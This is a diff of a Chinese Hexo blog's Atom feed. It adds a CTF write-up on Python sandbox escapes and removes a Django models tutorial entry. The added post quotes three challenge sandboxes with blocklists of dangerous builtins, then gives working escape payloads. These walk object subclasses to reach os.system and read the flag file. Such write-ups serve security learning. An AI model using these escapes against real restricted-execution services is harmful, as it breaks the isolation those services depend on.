@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://yoururl.com/"/>
-  <updated>2018-10-16T18:54:55.845Z</updated>
+  <updated>2018-10-18T10:38:15.890Z</updated>
   <id>http://yoururl.com/</id>
   
   <author>
@@ -15,6 +15,39 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Python沙箱逃逸（CTF）</title>
+    <link href="http://yoururl.com/2018/10/18/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%EF%BC%88CTF%EF%BC%89/"/>
+    <id>http://yoururl.com/2018/10/18/Python沙箱逃逸（CTF）/</id>
+    <published>2018-10-18T10:31:00.000Z</published>
+    <updated>2018-10-18T10:38:15.890Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="案例1"><a href="#案例1" class="headerlink" title="案例1"></a>案例1</h1><pre><code>def make_secure():      UNSAFE = [&apos;open&apos;,                &apos;file&apos;,                &apos;execfile&apos;,                &apos;compile&apos;,                &apos;reload&apos;,                &apos;__import__&apos;,                &apos;eval&apos;,                &apos;input&apos;]      for func in UNSAFE:          del __builtins__.__dict__[func]  from re import findall  # Remove dangerous builtins  make_secure()  print &apos;Go Ahead, Expoit me &gt;;D&apos;  while True:      try:          print &quot;&gt;&gt;&gt;&quot;,          # Read user input until the first whitespace character          inp = findall(&apos;\S+&apos;, raw_input())[0]          a = None          # Set a to the result from executing the user input          exec &apos;a=&apos; + inp          print &apos;&gt;&gt;&gt;&apos;, a      except Exception, e:          print &apos;Exception:&apos;, e  </code></pre><p>下面是脚本运行的效果。<br><img src="\images\pasted-306.png" alt="upload successful"><br>效果相当于python的命令界面，我们的目标是读取当前目录下的flag文件。<br>如果题目没有任何的过滤，读取的命令如下，导入os包，然后直接执行命令。　<br><img src="\images\pasted-307.png" alt="upload successful"><br>但是直接导入os会报错，如下图<br><img src="\images\pasted-308.png" alt="upload successful"><br>因为 del 命令删除了对应的命令，如下图<br><img src="\images\pasted-310.png" alt="upload successful"><br>看了Ned Batchelder的分享后学到了新知识。我们可以用file对象read文件<br>下面是元类和元类型详细信息，元组，子对象<br><img src="\images\pasted-311.png" alt="upload successful"><br>由于file在索引40，我们可以硬编码。如下图<br><img src="\images\pasted-312.png" alt="upload successful"><br>用file类型读取flag文件。　<br><img src="\images\pasted-313.png" alt="upload successful"><br><br><br><br></p><h1 id="案例2"><a href="#案例2" class="headerlink" title="案例2"></a>案例2</h1><pre><code>#!/usr/bin/env python   from __future__ import print_function  print(&quot;Welcome to my Python sandbox! Enter commands below!&quot;)  banned = [        &quot;import&quot;,      &quot;exec&quot;,      &quot;eval&quot;,      &quot;pickle&quot;,      &quot;os&quot;,      &quot;subprocess&quot;,      &quot;kevin sucks&quot;,      &quot;input&quot;,      &quot;banned&quot;,      &quot;cry sum more&quot;,      &quot;sys&quot;  ]  targets = __builtins__.__dict__.keys()    targets.remove(&apos;raw_input&apos;)    targets.remove(&apos;print&apos;)    for x in targets:        del __builtins__.__dict__[x]  while 1:        print(&quot;&gt;&gt;&gt;&quot;, end=&apos; &apos;)      data = raw_input()      for no in banned:          if no.lower() in data.lower():              print(&quot;No bueno&quot;)              break      else: # this means nobreak          exec data  </code></pre><p>相对于第一题，第二题是没有直接的回显。<br>我们可以用catch_warnings类（索引在59），进行命令执行。<br><img src="\images\pasted-314.png" alt="upload successful"></p><pre><code>().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals[&apos;linecache&apos;].__dict__[&apos;o&apos;+&apos;s&apos;].__dict__[&apos;sy&apos;+&apos;stem&apos;](&apos;ls&apos;)</code></pre><p><br><br><br></p><h1 id="案例3"><a href="#案例3" class="headerlink" title="案例3"></a>案例3</h1><pre><code># -*-coding:utf-8-*- #!/usr/bin/python3  import sys, cmd, os  del __builtins__.__dict__[&apos;__import__&apos;]  del __builtins__.__dict__[&apos;eval&apos;]  intro = &quot;&quot;&quot;pwnhub cuitpwn everythingRules:    -No import    -No ...    -No flag&quot;&quot;&quot;  def execute(command):         exec(command, globals())  class Jail(cmd.Cmd):      prompt     = &apos;&gt;&gt;&gt; &apos;      filtered    = &apos;\&apos;|.|input|if|else|eval|exit|import|quit|exec|code|const|vars|str|chr|ord|local|global|join|format|replace|translate|try|except|with|content|frame|back&apos;.split(&apos;|&apos;)      def do_EOF(self, line):          sys.exit()      def emptyline(self):          return cmd.Cmd.emptyline(self)      def default(self, line):          sys.stdout.write(&apos;\x00&apos;)      def postcmd(self, stop, line):          if any(f in line for f in self.filtered):              print(&quot;You are a big hacker !!!&quot;)              print(&quot;Go away&quot;)          else:             try:                  execute(line)             except NameError:                  print(&quot;NameError: name &apos;%s&apos; is not defined&quot; % line)             except Exception:                  print(&quot;Error: %s&quot; % line)          return cmd.Cmd.postcmd(self, stop, line)  if __name__ == &quot;__main__&quot;:      try:          Jail().cmdloop(intro)      except KeyboardInterrupt:          print(&quot;\rSee you next time !&quot;)  </code></pre><p>这题是cuit2017的题目，python3环境。<br>这里主要过滤了大量的字符，包括1，2题所用的点号。</p><ul><li>print(getattr(os, “system”)</li></ul><p>获取system函数地址，</p><ul><li>print(getattr(os, “system”)(“ls”))</li></ul><p>执行system(“ls”)<br>下面是获取flag的姿势<br><img src="\images\pasted-315.png" alt="upload successful"></p><p>以上都是利用Python作为脚本语言的特性来逃逸<br><br><br><br></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h1 id=&quot;案例1&quot;&gt;&lt;a href=&quot;#案例1&quot; class=&quot;headerlink&quot; title=&quot;案例1&quot;&gt;&lt;/a&gt;案例1&lt;/h1&gt;&lt;pre&gt;&lt;code&gt;def make_secure():  
+    UNSAFE = [&amp;apos;open&amp;apos;,  
+   
+      
+    
+    </summary>
+    
+      <category term="CTF" scheme="http://yoururl.com/categories/CTF/"/>
+    
+      <category term="Web" scheme="http://yoururl.com/categories/CTF/Web/"/>
+    
+    
+      <category term="python" scheme="http://yoururl.com/tags/python/"/>
+    
+      <category term="ctf" scheme="http://yoururl.com/tags/ctf/"/>
+    
+      <category term="沙箱逃逸" scheme="http://yoururl.com/tags/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/"/>
+    
+  </entry>
   
   <entry>
     <title>Linux文件系统</title>
@@ -385,11 +418,11 @@
       <category term="工控安全" scheme="http://yoururl.com/categories/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8/"/>
     
     
-      <category term="ICS" scheme="http://yoururl.com/tags/ICS/"/>
-    
       <category term="ctf" scheme="http://yoururl.com/tags/ctf/"/>
     
       <category term="write up" scheme="http://yoururl.com/tags/write-up/"/>
+    
+      <category term="ICS" scheme="http://yoururl.com/tags/ICS/"/>
     
       <category term="plc" scheme="http://yoururl.com/tags/plc/"/>
     
@@ -419,13 +452,13 @@
       <category term="工控安全" scheme="http://yoururl.com/categories/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8/"/>
     
     
-      <category term="ICS" scheme="http://yoururl.com/tags/ICS/"/>
-    
       <category term="modbus" scheme="http://yoururl.com/tags/modbus/"/>
     
       <category term="ctf" scheme="http://yoururl.com/tags/ctf/"/>
     
       <category term="write up" scheme="http://yoururl.com/tags/write-up/"/>
+    
+      <category term="ICS" scheme="http://yoururl.com/tags/ICS/"/>
     
   </entry>
   
@@ -478,9 +511,9 @@
       <category term="工控安全" scheme="http://yoururl.com/categories/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8/"/>
     
     
-      <category term="ICS" scheme="http://yoururl.com/tags/ICS/"/>
-    
       <category term="modbus" scheme="http://yoururl.com/tags/modbus/"/>
+    
+      <category term="ICS" scheme="http://yoururl.com/tags/ICS/"/>
     
       <category term="工控协议" scheme="http://yoururl.com/tags/%E5%B7%A5%E6%8E%A7%E5%8D%8F%E8%AE%AE/"/>
     
@@ -562,36 +595,6 @@
 &lt;hr&gt;
 &lt;p&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;/p&gt;
 &lt;h1 id=&quot;模板&quot;&gt;&lt;a href=&quot;#模板&quot; class=&quot;headerlink&quot; title=&quot;模板&quot;&gt;&lt;/a&gt;模板&lt;/h1&gt;&lt;p&gt;&lt;i
-      
-    
-    </summary>
-    
-      <category term="Django学习笔记" scheme="http://yoururl.com/categories/Django%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
-    
-    
-      <category term="python" scheme="http://yoururl.com/tags/python/"/>
-    
-      <category term="django" scheme="http://yoururl.com/tags/django/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>3_Django模型</title>
-    <link href="http://yoururl.com/2018/07/28/Django%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-3/"/>
-    <id>http://yoururl.com/2018/07/28/Django学习笔记-3/</id>
-    <published>2018-07-28T04:05:00.000Z</published>
-    <updated>2018-08-02T17:45:28.000Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong><em>Models.py</em></strong></p><hr><p><br><br><br></p><h1 id="ORM"><a href="#ORM" class="headerlink" title="ORM"></a>ORM</h1><h2 id="对象-关系-映射"><a href="#对象-关系-映射" class="headerlink" title="对象-关系-映射"></a>对象-关系-映射</h2><p>根据对象的类型生成表结构<br>将对象，列表的操作，转换为sql语句<br>将sql查询到的结果转换为对象，列表  </p><p>Django中的模型包含存储数据的字段和约束，对应着数据库中唯一的表<br><img src="\images\pasted-75.png" alt="upload successful"><br><br></p><h2 id="使用mysql数据库"><a href="#使用mysql数据库" class="headerlink" title="使用mysql数据库"></a>使用mysql数据库</h2><p>pip install mysql-python</p><ul><li>在mysql中创建数据库<br>create database test2 charest=utf8;</li><li>打开settings.py文件，修改DATABASES项<br>可以看到我们现在用的是sqlite3这个数据库(自己生成一个db.sqlite3数据库文件)<br><img src="\images\pasted-77.png" alt="upload successful"><br><img src="\images\pasted-79.png" alt="upload successful"><br>settings.py中改个配置就可以用我们的mysql数据库<br><img src="\images\pasted-76.png" alt="upload successful"><br><img src="\images\pasted-78.png" alt="upload successful"><br><br></li></ul><h2 id="开发流程"><a href="#开发流程" class="headerlink" title="开发流程"></a>开发流程</h2><p><img src="\images\pasted-81.png" alt="upload successful"></p><h2 id="使用已有数据库生成模型类"><a href="#使用已有数据库生成模型类" class="headerlink" title="使用已有数据库生成模型类"></a>使用已有数据库生成模型类</h2><p>python manage.py inspectdb &gt; booktest/models.py<br><br><br><br></p><h1 id="创建添加应用"><a href="#创建添加应用" class="headerlink" title="创建添加应用"></a>创建添加应用</h1><p>python manage.py startapp booktest<br>创建应用之后需要把应用booktest添加到settings.py的INSTALLED_APPS<br><img src="\images\pasted-82.png" alt="upload successful"></p><h2 id="定义模型"><a href="#定义模型" class="headerlink" title="定义模型"></a>定义模型</h2><p><img src="\images\pasted-83.png" alt="upload successful"></p><h2 id="定义属性"><a href="#定义属性" class="headerlink" title="定义属性"></a>定义属性</h2><p><img src="\images\pasted-84.png" alt="upload successful"></p><h2 id="字段类型"><a href="#字段类型" class="headerlink" title="字段类型"></a>字段类型</h2><p><img src="\images\pasted-85.png" alt="upload successful"></p><h2 id="字段选项"><a href="#字段选项" class="headerlink" title="字段选项"></a>字段选项</h2><p><img src="\images\pasted-86.png" alt="upload successful"></p><h2 id="关系"><a href="#关系" class="headerlink" title="关系"></a>关系</h2><p><img src="\images\pasted-87.png" alt="upload successful"><br><br><br></p><h1 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h1><ul><li>在models.py中定义表结构<br><img src="\images\pasted-88.png" alt="upload successful"></li><li>生成迁移之后<br>python manage.py makemigrations<br><img src="\images\pasted-89.png" alt="upload successful"></li><li>执行迁移之后<br>python manage.py migrate<br><img src="\images\pasted-90.png" alt="upload successful"><br><br><br></li></ul><h1 id="类的属性"><a href="#类的属性" class="headerlink" title="类的属性"></a>类的属性</h1><p><img src="\images\pasted-91.png" alt="upload successful"></p><h2 id="管理器（可自定义）"><a href="#管理器（可自定义）" class="headerlink" title="管理器（可自定义）"></a>管理器（可自定义）</h2><p>模型类—&gt;管理器—&gt;数据库（管理器是模型类的一个属性，用于将对象和数据表映射）<br><img src="\images\pasted-92.png" alt="upload successful"><br><img src="\images\pasted-93.png" alt="upload successful"><br><img src="\images\pasted-94.png" alt="upload successful"><br><img src="\images\pasted-95.png" alt="upload successful"></p><h2 id="模型类的创建方法"><a href="#模型类的创建方法" class="headerlink" title="模型类的创建方法"></a>模型类的创建方法</h2><p>&emsp;&emsp;在自定义的模型类中写<strong>init</strong>方法时会报错，因为model.Model中已经有了<strong>init</strong>方法，那我们怎么快捷创建每个模型类呢？<br><strong><em>解决方法：</em></strong>  </p><ul><li>(1) 创建<strong><em>类方法</em></strong>。 我们在模型类中，自定义一个创建模型类的方法<br><img src="\images\pasted-96.png" alt="upload successful"><br>我们在python manage.py shell中，创建一个abc对象：<br><img src="\images\pasted-97.png" alt="upload successful"><br>报错是因为时区问题，不影响<br><img src="\images\pasted-98.png" alt="upload successful"></li><li>(2) 在<strong><em>自定义的管理器</em></strong>中，创建对象方法 （不在类中做这件事）<br><img src="\images\pasted-99.png" alt="upload successful"><br><img src="\images\pasted-100.png" alt="upload successful"><br><img src="\images\pasted-101.png" alt="upload successful"><br><br><br></li></ul><h1 id="模型查询"><a href="#模型查询" class="headerlink" title="模型查询"></a>模型查询</h1><p><img src="\images\pasted-102.png" alt="upload successful"></p><h2 id="查询集"><a href="#查询集" class="headerlink" title="查询集"></a>查询集</h2><p><img src="\images\pasted-103.png" alt="upload successful"></p><h3 id="限制查询集"><a href="#限制查询集" class="headerlink" title="限制查询集"></a>限制查询集</h3><p><img src="\images\pasted-104.png" alt="upload successful"></p><h3 id="查询集的缓存"><a href="#查询集的缓存" class="headerlink" title="查询集的缓存"></a>查询集的缓存</h3><p><img src="\images\pasted-105.png" alt="upload successful"></p><h2 id="字段查询"><a href="#字段查询" class="headerlink" title="字段查询"></a>字段查询</h2><p><img src="\images\pasted-106.png" alt="upload successful"></p><h3 id="比较运算符"><a href="#比较运算符" class="headerlink" title="比较运算符"></a>比较运算符</h3><p><img src="\images\pasted-107.png" alt="upload successful"><br><img src="\images\pasted-108.png" alt="upload successful"><br><br><br></p><h1 id="聚合函数"><a href="#聚合函数" class="headerlink" title="聚合函数"></a>聚合函数</h1><p><img src="\images\pasted-109.png" alt="upload successful"></p><h2 id="F对象"><a href="#F对象" class="headerlink" title="F对象"></a>F对象</h2><p><img src="\images\pasted-110.png" alt="upload successful"></p><h2 id="Q对象"><a href="#Q对象" class="headerlink" title="Q对象"></a>Q对象</h2><p><img src="\images\pasted-111.png" alt="upload successful"></p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;p&gt;&lt;strong&gt;&lt;em&gt;Models.py&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
-&lt;hr&gt;
-&lt;p&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;/p&gt;
-&lt;h1 id=&quot;ORM&quot;&gt;&lt;a href=&quot;#ORM&quot; class=&quot;headerlink&quot; title=&quot;ORM&quot;&gt;&lt;/a&gt;ORM&lt;/h1&gt;&lt;
       
     
     </summary>
